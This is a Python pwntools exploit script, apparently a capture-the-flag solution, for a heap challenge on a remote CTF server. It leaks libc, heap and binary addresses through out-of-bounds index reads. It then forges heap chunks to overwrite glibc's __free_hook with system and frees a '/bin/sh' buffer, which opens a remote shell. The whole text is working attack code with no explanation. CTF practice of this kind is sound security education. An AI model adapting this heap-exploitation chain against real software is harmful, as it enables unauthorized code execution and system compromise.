from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")

def sl(b):
    r.sendlineafter(": ", b)

def s(b):
    r.sendafter(': ', b)

def alloc(size, data):
    sl("1")
    sl(str(size))
    s(data)

def free(index):
    sl("2")
    sl(str(index))

def view(index):
    sl("4")
    sl(str(index))



#r = process("./chall")
r = remote("pwn.chal.ctf.gdgalgiers.com", 1405)

# The only open slots I have are 0, 1 and 2.

view(-2)
r.recvuntil(b": ")
libc_leak = int(r.recv(14), 16)
libc.address = libc_leak - libc.sym._IO_2_1_stderr_
log.warn("Libc base @ 0x%x", libc.address)

alloc(0x100, "M")

view(0)
r.recvuntil(b": ")
heap_base = int(r.recv(14), 16) - 0x260
log.warn("Heap base @ 0x%x", heap_base)

view(-9)
r.recvuntil(b": ")
exe.address = int(r.recv(14), 16) - 0x4008
log.warn("Bin base @ 0x%x", exe.address)

free(0)
alloc(0x100, b"M"*0x70 + p64(0) + p64(0x101) + b"M"*0x80)
alloc(0x100, b"A"*0x20 + (p64(0) + p64(0x21))*3 + p64(heap_base + 0x2e0))
free(1)
free(((heap_base + 0x3c0) - (exe.sym.entries))//8)
alloc(0xf8, b"M"*0x80 + p64(0x0) + p64(0x111) + p64(libc.sym.__free_hook))

alloc(0x100, b"/bin/sh\x00")
alloc(0x100, p64(libc.sym.system))

free(1)
r.interactive()
